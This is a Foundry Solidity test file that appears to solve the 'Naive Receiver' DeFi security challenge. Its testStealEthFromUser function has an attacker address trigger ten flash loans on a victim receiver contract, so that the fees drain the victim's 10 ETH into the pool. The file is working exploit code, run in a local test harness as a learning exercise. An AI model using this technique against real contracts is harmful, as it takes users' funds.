//SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverLenderPool} from "../../src/naive-receiver/NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract breakNaiveReceiver is Test {
    uint256 public constant POOL_BALANCE = 1000 ether;
    uint256 public constant USER_WALLET = 10 ether;
    uint256 private constant FIXED_FEE = 1 ether;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    address attacker = makeAddr("attacker");
    address user = makeAddr("user");

    NaiveReceiverLenderPool vault;
    FlashLoanReceiver receiverContract;

    function setUp() public {
        vault = new NaiveReceiverLenderPool();
        receiverContract = new FlashLoanReceiver(address(vault));
        //deposit 1000ETH to the pool
        vm.deal(address(vault), POOL_BALANCE);
        //Lets give our innocent user some ETH
        vm.deal(address(receiverContract), USER_WALLET);
    }

    function testEthBalance() public {
        console.log(
            "ETH balance of the vault : ",
            address(vault).balance / 1e18
        );
        console.log("ETH balance of user : ", address(user).balance / 1e18);
    }

    function testStealEthFromUser() public {
        //Since the fee is only 1 ETH and we can steal 10ETH lets exploit the user 10 times
        uint256 i = 0;
        while (i < 10) {
            vm.prank(attacker);
            //attacker can provide an arbitrary address and drain its balance
            vault.flashLoan(receiverContract, ETH, 1000, "");
            i++;
        }

        assertEq(address(receiverContract).balance, 0);
        assertEq(address(vault).balance, POOL_BALANCE + USER_WALLET);
    }
}
